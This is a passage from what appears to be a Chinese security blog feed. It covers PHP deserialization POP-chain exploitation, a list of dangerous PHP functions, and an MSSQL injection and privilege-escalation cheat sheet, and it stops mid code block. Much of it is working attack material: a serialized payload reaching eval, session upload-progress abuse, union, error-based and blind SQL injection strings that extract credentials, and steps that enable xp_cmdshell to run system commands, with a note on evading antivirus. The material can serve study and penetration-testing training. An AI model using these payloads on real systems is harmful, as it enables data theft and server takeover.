class="title">__toString</span>(<span class="params"></span>)</span>&#123;                    <span class="comment">//    类被当作字符串时被调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-5-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./4-5-1.php&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路就是去执行eval并控制varr参数，造成任意代码执行，现在开始分析POP链</p><ol><li><p>foo3类的execute没有被调用，foo2类的__toString()方法里调用了execute，所以第一步是把$this-&gt;obj赋值为foo3类的对象。然后现在去寻找怎么去执行这个__toString</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br></pre></td></tr></table></figure></li><li><p>foo1类的__destruct()把$this-&gt;varr当做了字符串，所以这里把$this-&gt;varr赋值为foo2类的对象，就可以触发之前的__toString。POP链完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();</span><br></pre></td></tr></table></figure></li></ol><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();   </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;foo1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo3&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加上|</span></span><br><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;foo1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo3&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>继续分析4-5-2.php:</p><ol><li>代码使用php引擎来读取session文件，而系统默认是使用php_serialize引擎来存储session文件，存在session反序列化漏洞</li><li>文件导入4-5-1.php，实例化foo1，只要构造payload然后反序列化就可以造成rce</li></ol><p>构造payload:</p><ol><li><p>创建upload2.html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://127.0.0.1/unserialize/4-5-2.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><p>在文件上传的时候使用burp抓包，在 PHP_SESSION_UPLOAD_PROGRESS 的 value 值中添加’ | ‘和序列化的字符串</p></li></ol><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128134820.png"></p><h4 id="实例2-条件竞争POP"><a href="#实例2-条件竞争POP" class="headerlink" title="实例2 - 条件竞争POP"></a>实例2 - 条件竞争POP</h4><p>现在设置session.upload_progress.cleanup = On ，文件上传后，Session文件内容立即清空，这个时候就需要利用时间竞争来反序列化rce</p><p>文件上传的时候，抓取数据包，send to intruder模块，尝试大线程重放数据包</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>php反序列化从入门到放弃：<a href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p><p>PHP反序列化由浅入深：<a href="https://xz.aliyun.com/t/3674">https://xz.aliyun.com/t/3674</a></p><p>一篇文章带你深入理解漏洞之 PHP 反序列化漏洞：<a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>最通俗易懂的PHP反序列化原理分析：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p>带你走进PHP session反序列化漏洞：<a href="https://xz.aliyun.com/t/6640#toc-2">https://xz.aliyun.com/t/6640#toc-2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php安全函数绕过</title>
      <link href="/posts/17844/"/>
      <url>/posts/17844/</url>
      
        <content type="html"><![CDATA[<p>常见的PHP危险函数</p><p>SQL注入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">代码执行:</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">eval()、assert()、preg_replace()、create_function()</span><br><span class="line"></span><br><span class="line">array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()</span><br></pre></td></tr></table></figure><p>命令执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system()、exec()、passthru()、shell_exec()、popen()、proc_open()、pcntl_exec()</span><br></pre></td></tr></table></figure><p>xss:</p><p>xss漏洞关键就是寻找参数未过滤的输出函数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo、printf、print、print_r、sprintf、die 、var_dump、 var_export</span><br></pre></td></tr></table></figure><p>安装环节</p><p>header 检测lock文件是否存在</p><p>header文件只跳转 后面代码还是会执行</p><h1 id="待补充————————"><a href="#待补充————————" class="headerlink" title="待补充————————"></a>待补充————————</h1><p>get_magic_quotes_runtime()    // php.ini文件</p><p>二次注入</p><p>mysql_escape_string()</p><p>二次注入</p><p>mysql_real_escape_string()</p><p>addslashes()</p><p>编码注入</p><p>1.将字符串转为16进制编码数据或使用char函数（十进制）进行转化（因为数据库会自动把16进制转化）<br>2.用注释符去掉输入密码部分如”–/*#”</p><p>二次注入</p><p>宽字节注入</p><p>htmlspecialchars()</p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL注入及提权</title>
      <link href="/posts/26454/"/>
      <url>/posts/26454/</url>
      
        <content type="html"><![CDATA[<h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h2><ul><li><strong>固定服务器角色</strong></li></ul><table><thead><tr><th>固定服务器</th><th>角色说明</th></tr></thead><tbody><tr><td>sysadmin</td><td>执行SQLServer中的任何动作</td></tr><tr><td>serveradmin</td><td>配置服务器设置</td></tr><tr><td>setupadmin</td><td>安装复制和管理扩展过程</td></tr><tr><td>securityadmin</td><td>管理登录和CREATEDATABASE的权限以及阅读审计</td></tr><tr><td>processadmin</td><td>管理SQLServer进程</td></tr><tr><td>dbcreator</td><td>创建和修改数据库</td></tr><tr><td>diskadmin</td><td>管理磁盘文件</td></tr></tbody></table><ul><li><strong>固定数据库角色</strong></li></ul><table><thead><tr><th>固定数据库</th><th>角色说明</th></tr></thead><tbody><tr><td>db_owner</td><td>可以执行数据库中技术所有动作的用户</td></tr><tr><td>db_accessadmin</td><td>可以添加、删除用户的用户</td></tr><tr><td>db_datareader</td><td>可以查看所有数据库中用户表内数据的用户</td></tr><tr><td>db_datawriter</td><td>可以添加、修改或删除所有数据库中用户表内数据的用户</td></tr><tr><td>db_ddladmin</td><td>可以在数据库中执行所有DDL操作的用户</td></tr><tr><td>db_securityadmin</td><td>可以管理数据库中与安全权限有关所有动作的用户</td></tr><tr><td>db_backoperator</td><td>可以备份数据库的用户</td></tr><tr><td>db_denydatareader</td><td>不能看到数据库中任何数据的用户</td></tr><tr><td>db_denydatawriter</td><td>不能改变数据库中任何数据的用户</td></tr></tbody></table><h2 id="Mssql注入"><a href="#Mssql注入" class="headerlink" title="Mssql注入"></a>Mssql注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- # 注释符号</span></span><br><span class="line">;<span class="operator">%</span><span class="number">00</span>      注释符号</span><br><span class="line"><span class="comment">/* 注释符号</span></span><br><span class="line"><span class="comment">/**/</span>            空白字符</span><br><span class="line"><span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="number">0</span>F,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span>         空白字符</span><br><span class="line">@<span class="variable">@version</span>版本信息</span><br><span class="line">db_name()当前数据库名</span><br><span class="line">user_name()     当前用户名</span><br><span class="line">host_name()当前服务器名</span><br><span class="line">@<span class="variable">@servername</span>    当前服务器名</span><br><span class="line">;<span class="keyword">select</span> <span class="keyword">user</span>    查询是否支持多语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> info <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> host_name()<span class="operator">=</span>@<span class="variable">@servername</span>;<span class="comment">--&#x27;  判断是否站库分离</span></span><br></pre></td></tr></table></figure><ul><li><strong>注入的主要视图表</strong></li></ul><p>每个数据库下面都有一个视图表,需要跨库查需要前面加库名 如master.information_schema.tables</p><table><thead><tr><th>视图表</th><th>列名</th><th>说明</th></tr></thead><tbody><tr><td>master.dbo.sysdatabases</td><td>name 数据库名</td><td>SQL server中所有的数据库</td></tr><tr><td>[库名].dbo.Sysobjects</td><td>name、id、xtype=’U’</td><td>SQL server中当前用户数据库的表</td></tr><tr><td>[库名].dbo.Syscolumns</td><td>name、ID,id 是用 sysobjects 得到的表的 ID 号</td><td>SQLserver中当前用户数据库的列</td></tr><tr><td>sys.sql_logins</td><td></td><td>SQL server中所有的登录名</td></tr></tbody></table><ul><li><strong>注入的权限判断</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_member(<span class="string">&#x27;db_owner&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><strong>判断是否为MSSQL数据库</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects)      返回正常为mssql数据库</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sysobjects)  返回正常为mssql数据库</span><br></pre></td></tr></table></figure></li></ul><h3 id="联合注入过程"><a href="#联合注入过程" class="headerlink" title="联合注入过程"></a>联合注入过程</h3><p>mssql联合注入我们一般不使用 数字占位，而是null.因为你使用数字占位可能会发生隐式转换</p><ol><li>获取当前数据库版本<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,@@version</span></span><br></pre></td></tr></table></figure></li><li>获取当前数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,db_name() --</span></span><br></pre></td></tr></table></figure></li><li>获取所有数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,name from master.sys.databases where name not in (select top 1 name from master.sys.database) --</span></span><br></pre></td></tr></table></figure></li><li>获取表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>查询数据库存在的表</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 name from test.dbo.sysobjects where xtype=&#x27;</span>U<span class="string">&#x27; and name not in (select top 0 name from test.dbo.sysobjects) --</span></span><br></pre></td></tr></table></figure></li><li>获取列名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.dbo.syscolumns <span class="keyword">where</span> id <span class="operator">=</span><span class="number">549576996</span>;   <span class="operator">/</span><span class="operator">/</span>sysobjects表查询到的表id</span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> <span class="number">22.</span>dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> aspcms.dbo.sysobjects <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;jinke_user&#x27;</span>); </span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 name from  aspcms.dbo.syscolumns where id=(select id from aspcms.dbo.sysobjects where name=&#x27;</span>AspCms_User<span class="string">&#x27;) and name not in(select top 6 name from  aspcms.dbo.syscolumns where id=(select id from aspcms.dbo.sysobjects where name=&#x27;</span>AspCms_User<span class="string">&#x27;)) --</span></span><br></pre></td></tr></table></figure></li><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,username,password from user where username not in (select top 1 username from user) and password not in(select top 1 password from user)--</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="报错注入过程"><a href="#报错注入过程" class="headerlink" title="报错注入过程"></a>报错注入过程</h3><ul><li><strong>xml path(‘’) 报错</strong></li></ul><ol><li>判断版本号<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> @<span class="variable">@version</span><span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>获取当前数据库&amp;当前用户名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> db_name<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> (<span class="keyword">select</span> db_name())<span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> user_name<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>获取所有数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> name <span class="keyword">from</span> master.sys.databases <span class="keyword">where</span> database_id<span class="operator">=</span><span class="number">1</span>)<span class="operator">&gt;</span><span class="number">0</span> <span class="operator">/</span><span class="operator">/</span>取库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> quotename(<span class="built_in">count</span>(name)) <span class="keyword">from</span> master.sys.databases)<span class="operator">=</span><span class="number">10</span> <span class="operator">/</span><span class="operator">/</span>取库数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master.sys.databases <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>))<span class="operator">=</span><span class="number">1</span> <span class="comment">--  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and(select quotename(name) from test.dbo.sysobjects where xtype=&#x27;</span>U<span class="string">&#x27; for xml path(&#x27;&#x27;))=1 -- --  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取字段名 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>)  <span class="operator">/</span><span class="operator">/</span>获取第一个</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> top <span class="number">2</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>))     <span class="operator">/</span><span class="operator">/</span><span class="keyword">not</span> <span class="keyword">in</span> 遍历字段名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=(select quotename(name) from test.dbo.syscolumns where id =(select id from test.dbo.sysobjects where name =&#x27;</span>users<span class="string">&#x27;)  for xml path(&#x27;&#x27;))--     //一次取所有users 表所有的字段.</span></span><br></pre></td></tr></table></figure></li><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>)  遍历id</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(username),quotename(password) <span class="keyword">from</span> users <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>)) <span class="operator">/</span><span class="operator">/</span>一次取所有</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>cast .. as int 报错</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">select</span> quotename(LoginName) <span class="keyword">from</span> test.dbo.aspcms_user) <span class="keyword">as</span> <span class="type">int</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;=</span> <span class="number">109</span></span><br></pre></td></tr></table></figure><h3 id="时间盲注过程"><a href="#时间盲注过程" class="headerlink" title="时间盲注过程"></a>时间盲注过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>;if (<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))<span class="operator">=</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>;if (ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="存储过程提权"><a href="#存储过程提权" class="headerlink" title="存储过程提权"></a>存储过程提权</h2><p>扩展存储过程是MSsql提供的特殊功能。所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p><ul><li><strong>前提：数据库是db_owner权限</strong></li></ul><table><thead><tr><th>扩展存储过程</th><th>说明</th></tr></thead><tbody><tr><td>xp_cmdshell</td><td>直接执行系统命令</td></tr><tr><td>xp_regread</td><td>进行注册表读取</td></tr><tr><td>xp_regwrite</td><td>写入注册表</td></tr><tr><td>xp_dirtree</td><td>进行列目录操作</td></tr><tr><td>xp_ntsec_enumdomains</td><td>查看domain信息</td></tr></tbody></table><ul><li><strong>XP_cmdshell</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span> master.sys.xp_cmdshell <span class="string">&#x27;net user&#x27;</span></span><br></pre></td></tr></table></figure><p>2008默认是没有开启的,而且2008不像以前的版本可以直接加管理员账号了,需要写shell或者执行CS木马上线提权.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;<span class="comment">--</span></span><br></pre></td></tr></table></figure><ul><li><strong>sp_oacreate</strong></li></ul><p>当xpcmdshell 被删除可以使用这个来提权试试,恢复spoacreate,沙盒模式,可以过360!</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 